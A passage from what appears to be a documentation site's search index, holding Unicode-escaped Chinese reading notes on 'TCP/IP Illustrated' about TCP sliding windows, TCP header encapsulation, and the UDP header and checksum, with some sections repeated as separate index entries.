\u6765\u81ea\u8fd9\u6837\u7684\u60f3\u6cd5\uff1a\u5982\u679c\u4f60\u628a\u5728\u4e00\u4e2a\u901a\u4fe1\u5bf9\u8bdd\u4e2d\u53d1\u9001\u7684\u6240\u6709\u5206\u7ec4\u6392\u6210\u957f\u957f\u7684\u4e00\u884c\uff0c\u4f46\u53ea\u80fd\u901a\u8fc7\u4e00\u4e2a\u5c0f\u5b54\u6765\u89c2\u5bdf\u5b83\u4eec\uff0c\u4f60\u5c31\u53ea\u80fd\u770b\u5230\u5b83\u4eec\u7684\u4e00\u4e2a\u5b50\u96c6\u2014\u2014\u50cf\u901a\u8fc7\u4e00\u4e2a\u7a97\u53e3\u89c2\u770b\u4e00\u6837\u3002\u53d1\u9001\u65b9\u7684\u7a97\u53e3\uff08\u4ee5\u53ca\u5176\u4ed6\u5206\u7ec4\u961f\u5217\uff09\u53ef\u753b\u56fe\u63cf\u8ff0\u6210\u56fe12-1\u90a3\u6837\u3002 \u8fd9\u4e2a\u56fe\u663e\u793a\u4e86\u5f53\u524d\u4e09\u4e2a\u5206\u7ec4\u7684\u7a97\u53e3\uff0c\u6574\u4e2a\u7a97\u53e3\u5927\u5c0f\u662f3\u30023\u53f7\u5206\u7ec4\u5df2\u7ecf\u88ab\u53d1\u9001\u548c\u786e\u8ba4\uff0c\u6240\u4ee5\u7531\u53d1\u9001\u65b9\u4fdd\u5b58\u7684\u5b83\u7684\u526f\u672c\u53ef\u4ee5\u88ab\u91ca\u653e\u3002\u5206\u7ec47\u5728\u53d1\u9001\u65b9\u5df2\u7ecf\u51c6\u5907\u597d\uff0c\u4f46\u8fd8\u6ca1\u88ab\u53d1\u9001\uff0c\u56e0\u4e3a\u5b83\u8fd8\u6ca1\u201c\u8fdb\u5165\u201d\u7a97\u53e3\u3002\u73b0\u5728\u5982\u679c\u6211\u4eec\u60f3\u8c61\u6570\u636e\u5f00\u59cb\u4ece\u53d1\u9001\u65b9\u6d41\u5230\u63a5\u6536\u65b9\uff0cACK\u5f00\u59cb\u4ee5\u76f8\u53cd\u7684\u65b9\u5411\u6d41\u52a8\uff0c\u53d1\u9001\u65b9\u53ef\u80fd\u4e0b\u4e00\u6b65\u5c31\u63a5\u6536\u5230\u4e00\u4e2a\u5206\u7ec44\u7684ACK\u3002\u5f53\u8fd9\u53d1\u751f\u65f6\uff0c\u7a97\u53e3\u5411\u53f3\u8fb9\u201c\u6ed1\u52a8\u201d\u4e00\u4e2a\u5206\u7ec4\uff0c\u610f\u5473\u7740\u5206\u7ec44\u7684\u526f\u672c\u53ef\u4ee5\u91ca\u653e\u4e86\uff0c\u800c\u5206\u7ec47\u53ef\u4ee5\u88ab\u53d1\u9001\u4e86\u3002\u7a97\u53e3\u7684\u8fd9\u79cd\u6ed1\u52a8\u7ed9\u8fd9\u79cd\u7c7b\u578b\u7684\u534f\u8bae\u589e\u52a0\u4e86\u4e00\u4e2a\u540d\u5b57\uff0c \u6ed1\u52a8\u7a97\u53e3\uff08sliding window\uff09 \u534f\u8bae\u3002","title":"12.1.2 \u5206\u7ec4\u7a97\u53e3\u548c\u6ed1\u52a8\u7a97\u53e3"},{"location":"reading_notes/tcp_ip_illustrated/the_transmission_control_protocol_preliminaries/#123-tcp","text":"\u56fe12-2\u663e\u793a\u4e86TCP\u5728IP\u6570\u636e\u62a5\u4e2d\u7684\u5c01\u88c5\u3002 \u5934\u90e8\u672c\u8eab\u660e\u663e\u8981\u6bd4\u5728\u7b2c10\u7ae0\u6211\u4eec\u89c1\u8fc7\u7684UDP\u7684\u5934\u90e8\u66f4\u590d\u6742\u3002\u8fd9\u5e76\u4e0d\u5f88\u4ee4\u4eba\u60ca\u8bb6\uff0c\u56e0\u4e3aTCP\u662f\u4e00\u4e2a\u660e\u663e\u8981\u66f4\u590d\u6742\u7684\u534f\u8bae\uff0c\u5b83\u5fc5\u987b\u4fdd\u6301\u8fde\u63a5\u7684\u6bcf\u4e00\u7aef\u77e5\u9053\uff08\u540c\u6b65\uff09\u6700\u65b0\u72b6\u6001\u3002\u5982\u56fe12-3\u6240\u793a\u3002","title":"12.3 TCP\u5934\u90e8\u548c\u5c01\u88c5"},{"location":"reading_notes/tcp_ip_illustrated/user_datagram_protocol_and_ip_fragmentation/","text":"10.1 \u5f15\u8a00 UDP\u662f\u4e00\u79cd\u4fdd\u7559\u6d88\u606f\u8fb9\u754c\u7684\u7b80\u5355\u7684\u9762\u5411\u6570\u636e\u62a5\u7684\u4f20\u8f93\u5c42\u534f\u8bae\u3002\u5b83\u4e0d\u63d0\u4f9b\u5dee\u9519\u7ea0\u6b63\u3001\u961f\u5217\u7ba1\u7406\u3001\u91cd\u590d\u6d88\u9664\u3001\u6d41\u91cf\u63a7\u5236\u548c\u62e5\u585e\u63a7\u5236\u3002\u5b83\u63d0\u4f9b\u5dee\u9519\u68c0\u6d4b\uff0c\u5305\u542b\u6211\u4eec\u5728\u4f20\u8f93\u5c42\u4e2d\u78b0\u5230\u7684\u7b2c\u4e00\u4e2a\u771f\u5b9e\u7684 \u7aef\u5230\u7aef \uff08end-to-end\uff09\u6821\u9a8c\u548c\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6bcf\u4e2a\u88ab\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\u7684UDP\u8f93\u51fa\u64cd\u4f5c\u53ea\u4ea7\u751f\u4e00\u4e2aUDP\u6570\u636e\u62a5\uff0c\u4ece\u800c\u53d1\u9001\u4e00\u4e2aIP\u6570\u636e\u62a5\u3002 [RFC0768]\u662fUDP\u7684\u6b63\u5f0f\u89c4\u8303\uff0c\u5b83\u81f3\u4eca\u4ecd\u7136\u662f\u4e00\u4e2a\u6807\u51c6\uff0c30\u591a\u5e74\u6765\u6ca1\u6709\u505a\u8fc7\u91cd\u5927\u7684\u4fee\u6539\u3002\u5982\u524d\u6240\u8ff0\uff0cUDP\u4e0d\u63d0\u4f9b\u5dee\u9519\u7ea0\u6b63\uff1a\u5b83\u628a\u5e94\u7528\u7a0b\u5e8f\u4f20\u7ed9IP\u5c42\u7684\u6570\u636e\u53d1\u9001\u51fa\u53bb\uff0c\u4f46\u662f\u5e76\u4e0d\u4fdd\u8bc1\u5b83\u4eec\u80fd\u591f\u5230\u8fbe\u76ee\u7684\u5730\u3002\u53e6\u5916\uff0c\u6ca1\u6709\u534f\u8bae\u673a\u5236\u9632\u6b62\u9ad8\u901fUDP\u6d41\u91cf\u5bf9\u5176\u4ed6\u7f51\u7edc\u7528\u6237\u7684\u6d88\u6781\u5f71\u54cd\u3002 \u56e0\u4e3a\u5b83\u7684\u65e0\u8fde\u63a5\u7279\u5f81\uff0c\u5b83\u8981\u6bd4\u5176\u4ed6\u7684\u4f20\u8f93\u534f\u8bae\u4f7f\u7528\u66f4\u5c11\u7684\u5f00\u9500\u3002\u53e6\u5916\uff0c\u5e7f\u64ad\u548c\u7ec4\u64ad\u64cd\u4f5c\uff08\u89c1\u7b2c9\u7ae0\uff09\u66f4\u591a\u76f4\u63a5\u4f7f\u7528\u50cfUDP\u8fd9\u6837\u7684\u65e0\u8fde\u63a5\u4f20\u8f93\u3002 \u56fe10-1\u663e\u793a\u4e86\u4e00\u4e2aUDP\u6570\u636e\u62a5\u4f5c\u4e3a\u5355\u4e2aIPv4\u6570\u636e\u62a5\u7684\u5c01\u88c5\u3002IPv6\u7684\u5c01\u88c5\u662f\u7c7b\u4f3c\u7684\uff0c\u4f46\u662f\u4e00\u4e9b\u7ec6\u8282\u6709\u5c11\u8bb8\u4e0d\u540c\uff0c\u6211\u4eec\u572810.5\u8282\u8ba8\u8bba\u5b83\u4eec\u3002IPv4 \u534f\u8bae \uff08Protocol\uff09\u5b57\u6bb5\u7528\u503c17\u6765\u6807\u8bc6UDP\u3002IPv6\u5219\u5728 \u4e0b\u4e00\u4e2a\u5934\u90e8 \uff08Next Header\uff09\u5b57\u6bb5\u4f7f\u7528\u76f8\u540c\u7684\u503c\u3002\u5728\u672c\u7ae0\u7a0d\u540e\u6211\u4eec\u5c06\u63a2\u8ba8\u5f53UDP\u6570\u636e\u62a5\u5927\u5c0f\u8d85\u8fc7MTU\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff0c\u6570\u636e\u5305\u5fc5\u987b\u88ab\u5206\u7247\u6210\u591a\u4e8e\u4e00\u4e2a\u7684IP\u5c42\u5206\u7ec4\u3002 10.2 UDP\u5934\u90e8 \u56fe10.2\u663e\u793a\u4e86\u4e00\u4e2a\u5305\u542b\u8d1f\u8f7d\u548cUDP\u5934\u90e8\uff08\u901a\u5e38\u662f8\u5b57\u8282\uff09\u7684UDP\u6570\u636e\u62a5\u3002 \u7aef\u53e3\u53f7\u76f8\u5f53\u4e8e \u90ae\u7bb1 \uff08mailbox\uff09\uff0c\u5e2e\u52a9\u534f\u8bae\u8fa8\u8ba4\u53d1\u9001\u548c\u63a5\u6536\u8fdb\u7a0b\uff08\u89c1\u7b2c1\u7ae0\uff09\u3002\u4ed6\u4eec\u7eaf\u5c5e \u62bd\u8c61\u7684 \uff08abstract\uff09\u2014\u2014\u5b83\u4eec\u4e0d\u4e0e\u4e3b\u673a\u4e0a\u7684\u4efb\u4f55\u7269\u7406\u5b9e\u4f53\u76f8\u5173\u3002 \u6e90\u7aef\u53e3\u53f7\u662f\u53ef\u9009\u7684\uff1b\u5982\u679c\u6570\u636e\u62a5\u7684\u53d1\u9001\u8005\u4e0d\u8981\u6c42\u5bf9\u65b9\u56de\u590d\u7684\u8bdd\uff0c\u5b83\u53ef\u88ab\u7f6e\u62100\u3002 \u56e0\u4e3aIP\u5c42\u6839\u636eIPv4\u5934\u90e8\u4e2d\u7684 \u534f\u8bae \u5b57\u6bb5\u6216IPv6\u5934\u90e8\u4e2d\u7684 \u4e0b\u4e00\u4e2a\u5934\u90e8 \u5b57\u6bb5\u7684\u503c\u5c06\u8fdb\u5165\u7684IP\u6570\u636e\u62a5\u5206\u79bb\u5230\u7279\u5b9a\u7684\u4f20\u8f93\u534f\u8bae\uff0c\u8fd9\u610f\u5473\u7740\u7aef\u53e3\u53f7\u5728\u4e0d\u540c\u7684\u4f20\u8f93\u534f\u8bae\u4e4b\u95f4\u662f\u72ec\u7acb\u7684\u3002 \u6709\u70b9\u62d7\u53e3\u3002\u4e0d\u8fc7\u4e66\u4e0a\u4e5f\u89e3\u91ca\u5f97\u5f88\u6e05\u695a\uff1a \u8fd9\u6837\u7684\u5206\u79bb\u5bfc\u81f4\u7684\u4e00\u4e2a\u76f4\u63a5\u7ed3\u679c\u662f\u4e24\u4e2a\u5b8c\u5168\u4e0d\u540c\u7684\u670d\u52a1\u5668\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u7aef\u53e3\u53f7\u548cIP\u5730\u5740\uff0c\u53ea\u8981\u5b83\u4eec\u4f7f\u7528\u4e0d\u540c\u7684\u4f20\u8f93\u534f\u8bae\u3002 \u6821\u9a8c\u548c \uff08Checksum\uff09\u5b57\u6bb5\u662f\u7aef\u5230\u7aef\u7684\uff0c\u662f\u5bf9\u5305\u542b\u4e86IP\u5934\u90e8\u4e2d\u7684 \u6e90 \uff08Source\uff09\u548c \u76ee\u7684IP\u5730\u5740 \uff08Destination Address\uff09\u5b57\u6bb5\u7684UDP\u4f2a\u5934\u90e8\u8ba1\u7b97\u5f97\u5230\u7684\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u5bf9\u8fd9\u4e9b\u5b57\u6bb5\u7684\u4fee\u6539\uff08\u5982\uff0c\u7531NAT\uff09\u90fd\u9700\u8981\u5bf9UDP\u6821\u9a8c\u548c\u8fdb\u884c\u4fee\u6539 \u53c2\u8003\u56fe10-2\uff0cUDP \u957f\u5ea6 \uff08Length\uff09\u5b57\u6bb5\u662fUDP\u5934\u90e8\u548cUDP\u6570\u636e\u7684\u603b\u957f\u5ea6\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002\u8fd9\u4e2a\u5b57\u6bb5\u7684\u6700\u5c0f\u503c\u662f8\uff0c\u9664\u975e\u4f7f\u7528\u4e86\u5e26\u6709IPv6\u8d85\u957f\u6570\u636e\u5305\uff08jumbogram\uff09\u7684UDP\uff08\u89c110.5\u8282\uff09\u3002 \u503c\u5f97\u6ce8\u610f\u7684\u662fUDP \u957f\u5ea6 \u5b57\u6bb5\u662f\u8363\u8a89\u7684\uff1bIPv4\u5934\u90e8\u5305\u542b\u4e86\u6570\u636e\u5305\u7684\u603b\u957f\u5ea6\uff08\u89c1\u7b2c5\u7ae0\uff09\uff0c\u540c\u65f6IPv6\u5934\u90e8\u5305\u542b\u4e86\u8d1f\u8f7d\u957f\u5ea6\u3002\u56e0\u6b64\uff0c\u4e00\u4e2aUDP/IPv4\u6570\u636e\u62a5\u7684\u957f\u5ea6\u7b49\u4e8eIPv4\u6570\u636e\u62a5\u7684\u603b\u957f\u5ea6\u51cf\u53bbIPv4\u5934\u90e8\u7684\u957f\u5ea6\u3002\u4e00\u4e2aUDP/IPv6\u6570\u636e\u62a5\u7684\u957f\u5ea6\u7b49\u4e8e\u5305\u542b\u5728IPv6\u5934\u90e8\u4e2d\u7684 \u8d1f\u8f7d\u957f\u5ea6 \uff08Payload Length\uff09\u5b57\u6bb5\u7684\u503c\u51cf\u53bb\u6240\u6709\u6269\u5c55\u5934\u90e8\uff08\u9664\u975e\u4f7f\u7528\u4e86\u8d85\u957f\u6570\u636e\u62a5\uff09\u7684\u957f\u5ea6\u3002\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0cUDP \u957f\u5ea6 \u5b57\u6bb5\u7684\u503c\u5e94\u8be5\u4e0e\u4eceIP\u5c42\u63d0\u4f9b\u7684\u4fe1\u606f\u8ba1\u7b97\u5f97\u5230\u7684\u957f\u5ea6\u662f\u4e00\u81f4\u7684\u3002 10.3 UDP\u6821\u9a8c\u548c UDP\u6821\u9a8c\u548c\u662f\u6211\u4eec\u9047\u5230\u7684\u7b2c\u4e00\u4e2a\u7aef\u5230\u7aef\u7684\u4f20\u8f93\u5c42\u6821\u9a8c\u548c\uff08ICMP\u6709\u4e00\u4e2a\u7aef\u5230\u7aef\u7684\u6821\u9a8c\u548c\uff0c\u4f46\u5b83\u4e0d\u662f\u4e00\u4e2a\u771f\u6b63\u7684\u4f20\u8f93\u534f\u8bae\uff09\u3002\u5b83\u8986\u76d6\u4e86UDP\u5934\u90e8\u3001UDP\u6570\u636e\u548c\u4e00\u4e2a\u4f2a\u5934\u90e8\uff08\u5728\u672c\u8282\u7a0d\u540e\u6709\u5b9a\u4e49\uff09\u3002 \u56de\u60f3\u4e00\u4e0bIPv4\u5934\u90e8\u4e2d\u7684\u6821\u9a8c\u548c\u53ea\u8986\u76d6\u6574\u4e2a\u5934\u90e8\uff08\u5373\u5b83\u5e76\u4e0d\u8986\u76d6IP\u5206\u7ec4\u4e2d\u7684\u4efb\u4f55\u6570\u636e\uff09\uff0c\u5b83\u5728\u6bcf\u4e2aIP\u8df3\u90fd\u8981\u88ab\u91cd\u65b0\u8ba1\u7b97\uff08\u56e0\u4e3aIPv4 TTL\u5b57\u6bb5\u7684\u503c\u5728\u6570\u636e\u62a5\u8f6c\u53d1\u65f6\u4f1a\u88ab\u8def\u7531\u5668\u51cf\u5c11\uff09\u3002\u4f20\u8f93\u534f\u8bae\uff08\u5982TCP\u3001UDP\uff09\u4f7f\u7528\u6821\u9a8c\u548c\u6765\u8986\u76d6\u5b83\u4eec\u7684\u5934\u90e8\u548c\u6570\u636e\u3002 \u867d\u7136\u8ba1\u7b97UDP\u6821\u9a8c\u548c\u7684\u57fa\u672c\u65b9\u6cd5\u4e0e\u6211\u4eec\u5728\u7b2c5\u7ae0\u63cf\u8ff0\u7684\u666e\u901a\u4e92\u8054\u7f51\u6821\u9a8c\u548c\uff0816\u4f4d\u5b57\u7684\u53cd\u7801\u548c\u7684\u53cd\u7801\uff09\u7c7b\u4f3c\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u4e24\u4e2a\u5c0f\u7684\u7ec6\u8282\u3002\u9996\u5148\uff0cUDP\u6570\u636e\u62a5\u957f\u5ea6\u53ef\u4ee5\u662f\u5947\u6570\u4e2a\u5b57\u8282\uff0c\u800c\u6821\u9a8c\u548c\u7b97\u6cd5\u53ea\u76f8\u52a016\u4f4d\u5b57\uff08\u603b\u662f\u5076\u6570\u4e2a\u5b57\u8282\uff09\u3002UDP\u7684\u5904\u7406\u8fc7\u7a0b\u662f\u5728\u5947\u6570\u957f\u5ea6\u7684\u6570\u636e\u62a5\u5c3e\u90e8\u8ffd\u52a0\u4e00\u4e2a\u503c\u4e3a0\u7684\u586b\u5145\uff08\u865a\uff09\u5b57\u8282\uff0c\u8fd9\u4ec5\u4ec5\u53ea\u662f\u4e3a\u4e86\u6821\u9a8c\u548c\u7684\u8ba1\u7b97\u4e0e\u9a8c\u8bc1\u3002 \u7b2c\u4e8c\u4e2a\u7ec6\u8282\u662fUDP\uff08\u4e5f\u5305\u62ecTCP\uff09\u8ba1\u7b97\u5b83\u7684\u6821\u9a8c\u548c\u65f6\u5305\u542b\u4e86\uff08\u4ec5\u4ec5\uff09\u884d\u751f\u81eaIPv4\u5934\u90e8\u7684\u5b57\u6bb5\u7684\u4e00\u4e2a12\u5b57\u8282\u7684 \u4f2a\u5934\u90e8 \u6216\u884d\u751f\u81eaIPv6\u5934\u90e8\u7684\u5b57\u6bb5\u7684\u4e00\u4e2a40\u5b57\u8282\u7684\u4f2a\u5934\u90e8\u3002\u8fd9\u4e2a\u4f2a\u5934\u90e8\u4e5f\u662f\u865a\u7684\uff0c\u5b83\u7684\u76ee\u7684\u53ea\u662f\u7528\u4e8e\u6821\u9a8c\u548c\u7684\u8ba1\u7b97\uff08\u5728\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\uff09\u3002","title":"\u7b2c10\u7ae0 \u7528\u6237\u6570\u636e\u62a5\u534f\u8bae\u548cIP\u5206\u7247"},{"location":"reading_notes/tcp_ip_illustrated/user_datagram_protocol_and_ip_fragmentation/#101","text":"UDP\u662f\u4e00\u79cd\u4fdd\u7559\u6d88\u606f\u8fb9\u754c\u7684\u7b80\u5355\u7684\u9762\u5411\u6570\u636e\u62a5\u7684\u4f20\u8f93\u5c42\u534f\u8bae\u3002\u5b83\u4e0d\u63d0\u4f9b\u5dee\u9519\u7ea0\u6b63\u3001\u961f\u5217\u7ba1\u7406\u3001\u91cd\u590d\u6d88\u9664\u3001\u6d41\u91cf\u63a7\u5236\u548c\u62e5\u585e\u63a7\u5236\u3002\u5b83\u63d0\u4f9b\u5dee\u9519\u68c0\u6d4b\uff0c\u5305\u542b\u6211\u4eec\u5728\u4f20\u8f93\u5c42\u4e2d\u78b0\u5230\u7684\u7b2c\u4e00\u4e2a\u771f\u5b9e\u7684 \u7aef\u5230\u7aef \uff08end-to-end\uff09\u6821\u9a8c\u548c\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6bcf\u4e2a\u88ab\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\u7684UDP\u8f93\u51fa\u64cd\u4f5c\u53ea\u4ea7\u751f\u4e00\u4e2aUDP\u6570\u636e\u62a5\uff0c\u4ece\u800c\u53d1\u9001\u4e00\u4e2aIP\u6570\u636e\u62a5\u3002 [RFC0768]\u662fUDP\u7684\u6b63\u5f0f\u89c4\u8303\uff0c\u5b83\u81f3\u4eca\u4ecd\u7136\u662f\u4e00\u4e2a\u6807\u51c6\uff0c30\u591a\u5e74\u6765\u6ca1\u6709\u505a\u8fc7\u91cd\u5927\u7684\u4fee\u6539\u3002\u5982\u524d\u6240\u8ff0\uff0cUDP\u4e0d\u63d0\u4f9b\u5dee\u9519\u7ea0\u6b63\uff1a\u5b83\u628a\u5e94\u7528\u7a0b\u5e8f\u4f20\u7ed9IP\u5c42\u7684\u6570\u636e\u53d1\u9001\u51fa\u53bb\uff0c\u4f46\u662f\u5e76\u4e0d\u4fdd\u8bc1\u5b83\u4eec\u80fd\u591f\u5230\u8fbe\u76ee\u7684\u5730\u3002\u53e6\u5916\uff0c\u6ca1\u6709\u534f\u8bae\u673a\u5236\u9632\u6b62\u9ad8\u901fUDP\u6d41\u91cf\u5bf9\u5176\u4ed6\u7f51\u7edc\u7528\u6237\u7684\u6d88\u6781\u5f71\u54cd\u3002 \u56e0\u4e3a\u5b83\u7684\u65e0\u8fde\u63a5\u7279\u5f81\uff0c\u5b83\u8981\u6bd4\u5176\u4ed6\u7684\u4f20\u8f93\u534f\u8bae\u4f7f\u7528\u66f4\u5c11\u7684\u5f00\u9500\u3002\u53e6\u5916\uff0c\u5e7f\u64ad\u548c\u7ec4\u64ad\u64cd\u4f5c\uff08\u89c1\u7b2c9\u7ae0\uff09\u66f4\u591a\u76f4\u63a5\u4f7f\u7528\u50cfUDP\u8fd9\u6837\u7684\u65e0\u8fde\u63a5\u4f20\u8f93\u3002 \u56fe10-1\u663e\u793a\u4e86\u4e00\u4e2aUDP\u6570\u636e\u62a5\u4f5c\u4e3a\u5355\u4e2aIPv4\u6570\u636e\u62a5\u7684\u5c01\u88c5\u3002IPv6\u7684\u5c01\u88c5\u662f\u7c7b\u4f3c\u7684\uff0c\u4f46\u662f\u4e00\u4e9b\u7ec6\u8282\u6709\u5c11\u8bb8\u4e0d\u540c\uff0c\u6211\u4eec\u572810.5\u8282\u8ba8\u8bba\u5b83\u4eec\u3002IPv4 \u534f\u8bae \uff08Protocol\uff09\u5b57\u6bb5\u7528\u503c17\u6765\u6807\u8bc6UDP\u3002IPv6\u5219\u5728 \u4e0b\u4e00\u4e2a\u5934\u90e8 \uff08Next Header\uff09\u5b57\u6bb5\u4f7f\u7528\u76f8\u540c\u7684\u503c\u3002\u5728\u672c\u7ae0\u7a0d\u540e\u6211\u4eec\u5c06\u63a2\u8ba8\u5f53UDP\u6570\u636e\u62a5\u5927\u5c0f\u8d85\u8fc7MTU\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff0c\u6570\u636e\u5305\u5fc5\u987b\u88ab\u5206\u7247\u6210\u591a\u4e8e\u4e00\u4e2a\u7684IP\u5c42\u5206\u7ec4\u3002","title":"10.1 \u5f15\u8a00"},{"location":"reading_notes/tcp_ip_illustrated/user_datagram_protocol_and_ip_fragmentation/#102-udp","text":"\u56fe10.2\u663e\u793a\u4e86\u4e00\u4e2a\u5305\u542b\u8d1f\u8f7d\u548cUDP\u5934\u90e8\uff08\u901a\u5e38\u662f8\u5b57\u8282\uff09\u7684UDP\u6570\u636e\u62a5\u3002 \u7aef\u53e3\u53f7\u76f8\u5f53\u4e8e \u90ae\u7bb1 \uff08mailbox\uff09\uff0c\u5e2e\u52a9\u534f\u8bae\u8fa8\u8ba4\u53d1\u9001\u548c\u63a5\u6536\u8fdb\u7a0b\uff08\u89c1\u7b2c1\u7ae0\uff09\u3002\u4ed6\u4eec\u7eaf\u5c5e \u62bd\u8c61\u7684 \uff08abstract\uff09\u2014\u2014\u5b83\u4eec\u4e0d\u4e0e\u4e3b\u673a\u4e0a\u7684\u4efb\u4f55\u7269\u7406\u5b9e\u4f53\u76f8\u5173\u3002 \u6e90\u7aef\u53e3\u53f7\u662f\u53ef\u9009\u7684\uff1b\u5982\u679c\u6570\u636e\u62a5\u7684\u53d1\u9001\u8005\u4e0d\u8981\u6c42\u5bf9\u65b9\u56de\u590d\u7684\u8bdd\uff0c\u5b83\u53ef\u88ab\u7f6e\u62100\u3002 \u56e0\u4e3aIP\u5c42\u6839\u636eIPv4\u5934\u90e8\u4e2d\u7684 \u534f\u8bae \u5b57\u6bb5\u6216IPv6\u5934\u90e8\u4e2d\u7684 \u4e0b\u4e00\u4e2a\u5934\u90e8 \u5b57\u6bb5\u7684\u503c\u5c06\u8fdb\u5165\u7684IP\u6570\u636e\u62a5\u5206\u79bb\u5230\u7279\u5b9a\u7684\u4f20\u8f93\u534f\u8bae\uff0c\u8fd9\u610f\u5473\u7740\u7aef\u53e3\u53f7\u5728\u4e0d\u540c\u7684\u4f20\u8f93\u534f\u8bae\u4e4b\u95f4\u662f\u72ec\u7acb\u7684\u3002 \u6709\u70b9\u62d7\u53e3\u3002\u4e0d\u8fc7\u4e66\u4e0a\u4e5f\u89e3\u91ca\u5f97\u5f88\u6e05\u695a\uff1a \u8fd9\u6837\u7684\u5206\u79bb\u5bfc\u81f4\u7684\u4e00\u4e2a\u76f4\u63a5\u7ed3\u679c\u662f\u4e24\u4e2a\u5b8c\u5168\u4e0d\u540c\u7684\u670d\u52a1\u5668\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u7aef\u53e3\u53f7\u548cIP\u5730\u5740\uff0c\u53ea\u8981\u5b83\u4eec\u4f7f\u7528\u4e0d\u540c\u7684\u4f20\u8f93\u534f\u8bae\u3002 \u6821\u9a8c\u548c \uff08Checksum\uff09\u5b57\u6bb5\u662f\u7aef\u5230\u7aef\u7684\uff0c\u662f\u5bf9\u5305\u542b\u4e86IP\u5934\u90e8\u4e2d\u7684 \u6e90 \uff08Source\uff09\u548c \u76ee\u7684IP\u5730\u5740 \uff08Destination Address\uff09\u5b57\u6bb5\u7684UDP\u4f2a\u5934\u90e8\u8ba1\u7b97\u5f97\u5230\u7684\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u5bf9\u8fd9\u4e9b\u5b57\u6bb5\u7684\u4fee\u6539\uff08\u5982\uff0c\u7531NAT\uff09\u90fd\u9700\u8981\u5bf9UDP\u6821\u9a8c\u548c\u8fdb\u884c\u4fee\u6539 \u53c2\u8003\u56fe10-2\uff0cUDP \u957f\u5ea6 \uff08Length\uff09\u5b57\u6bb5\u662fUDP\u5934\u90e8\u548cUDP\u6570\u636e\u7684\u603b\u957f\u5ea6\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002\u8fd9\u4e2a\u5b57\u6bb5\u7684\u6700\u5c0f\u503c\u662f8\uff0c\u9664\u975e\u4f7f\u7528\u4e86\u5e26\u6709IPv6\u8d85\u957f\u6570\u636e\u5305\uff08jumbogram\uff09\u7684UDP\uff08\u89c110.5\u8282\uff09\u3002 \u503c\u5f97\u6ce8\u610f\u7684\u662fUDP \u957f\u5ea6 \u5b57\u6bb5\u662f\u8363\u8a89\u7684\uff1bIPv4\u5934\u90e8\u5305\u542b\u4e86\u6570\u636e\u5305\u7684\u603b\u957f\u5ea6\uff08\u89c1\u7b2c5\u7ae0\uff09\uff0c\u540c\u65f6IPv6\u5934\u90e8\u5305\u542b\u4e86\u8d1f\u8f7d\u957f\u5ea6\u3002\u56e0\u6b64\uff0c\u4e00\u4e2aUDP/IPv4\u6570\u636e\u62a5\u7684\u957f\u5ea6\u7b49\u4e8eIPv4\u6570\u636e\u62a5\u7684\u603b\u957f\u5ea6\u51cf\u53bbIPv4\u5934\u90e8\u7684\u957f\u5ea6\u3002\u4e00\u4e2aUDP/IPv6\u6570\u636e\u62a5\u7684\u957f\u5ea6\u7b49\u4e8e\u5305\u542b\u5728IPv6\u5934\u90e8\u4e2d\u7684 \u8d1f\u8f7d\u957f\u5ea6 \uff08Payload Length\uff09\u5b57\u6bb5\u7684\u503c\u51cf\u53bb\u6240\u6709\u6269\u5c55\u5934\u90e8\uff08\u9664\u975e\u4f7f\u7528\u4e86\u8d85\u957f\u6570\u636e\u62a5\uff09\u7684\u957f\u5ea6\u3002\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0cUDP \u957f\u5ea6 \u5b57\u6bb5\u7684\u503c\u5e94\u8be5\u4e0e\u4eceIP\u5c42\u63d0\u4f9b\u7684\u4fe1\u606f\u8ba1\u7b97\u5f97\u5230\u7684\u957f\u5ea6\u662f\u4e00\u81f4\u7684\u3002","title":"10.2 UDP\u5934\u90e8"},{"location":"reading_notes/tcp_ip_illustrated/user_datagram_protocol_and_ip_fragmentation/#103-udp","text":"UDP\u6821\u9a8c\u548c\u662f\u6211\u4eec\u9047\u5230\u7684\u7b2c\u4e00\u4e2a\u7aef\u5230\u7aef\u7684\u4f20\u8f93\u5c42\u6821\u9a8c\u548c\uff08ICMP\u6709\u4e00\u4e2a\u7aef\u5230\u7aef\u7684\u6821\u9a8c\u548c\uff0c\u4f46\u5b83\u4e0d\u662f\u4e00\u4e2a\u771f\u6b63\u7684\u4f20\u8f93\u534f\u8bae\uff09\u3002\u5b83\u8986\u76d6\u4e86UDP\u5934\u90e8\u3001UDP\u6570\u636e\u548c\u4e00\u4e2a\u4f2a\u5934\u90e8\uff08\u5728\u672c\u8282\u7a0d\u540e\u6709\u5b9a\u4e49\uff09\u3002 \u56de\u60f3\u4e00\u4e0bIPv4\u5934\u90e8\u4e2d\u7684\u6821\u9a8c\u548c\u53ea\u8986\u76d6\u6574\u4e2a\u5934\u90e8\uff08\u5373\u5b83\u5e76\u4e0d\u8986\u76d6IP\u5206\u7ec4\u4e2d\u7684\u4efb\u4f55\u6570\u636e\uff09\uff0c\u5b83\u5728\u6bcf\u4e2aIP\u8df3\u90fd\u8981\u88ab\u91cd\u65b0\u8ba1\u7b97\uff08\u56e0\u4e3aIPv4 TTL\u5b57\u6bb5\u7684\u503c\u5728\u6570\u636e\u62a5\u8f6c\u53d1\u65f6\u4f1a\u88ab\u8def\u7531\u5668\u51cf\u5c11\uff09\u3002\u4f20\u8f93\u534f\u8bae\uff08\u5982TCP\u3001UDP\uff09\u4f7f\u7528\u6821\u9a8c\u548c\u6765\u8986\u76d6\u5b83\u4eec\u7684\u5934\u90e8\u548c\u6570\u636e\u3002 